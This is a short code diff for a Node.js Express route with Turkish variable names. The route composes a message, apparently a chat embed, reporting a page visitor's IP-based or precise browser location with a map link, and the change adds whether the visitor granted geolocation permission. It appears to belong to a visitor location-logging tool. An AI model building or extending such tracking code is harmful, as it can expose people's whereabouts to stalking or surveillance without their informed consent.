@@ -141,14 +141,20 @@ app.get('/', async (req, res) => {
     const eksKonum = geo.city ? geo.city+', '+geo.country : 'Bilinmiyor';
     let mapsLink = '';
     let konum = flag+' '+eksKonum;
-    if (req.query.lat && req.query.lon) {
+    let geoDurum = '';
+    if (req.query.geo === 'izin_verdi') {
       mapsLink = 'https://www.google.com/maps?q='+req.query.lat+','+req.query.lon;
       let acc = req.query.acc ? ' (±'+req.query.acc+'m)' : '';
       konum = flag+' '+eksKonum+'\n:crosshairs: Kesin konum:\n[Haritada göster]('+mapsLink+')'+acc;
+      geoDurum = 'Konuma izin verdi :white_check_mark:';
+    } else if (req.query.geo === 'izin_vermedi') {
+      geoDurum = 'Konuma izin vermedi :no_entry:';
     } else if (geo.lat) {
       mapsLink = 'https://www.google.com/maps?q='+geo.lat+','+geo.lon;
       konum = flag+' '+eksKonum+'\n[Haritada göster]('+mapsLink+')';
+      geoDurum = 'IP bazl\u0131 konum';
     }
+    if (geoDurum) konum += '\n_'+geoDurum+'_';
     const now = new Date();
     const fields = [
       { name: ':round_pushpin: Konum', value: konum, inline: true },
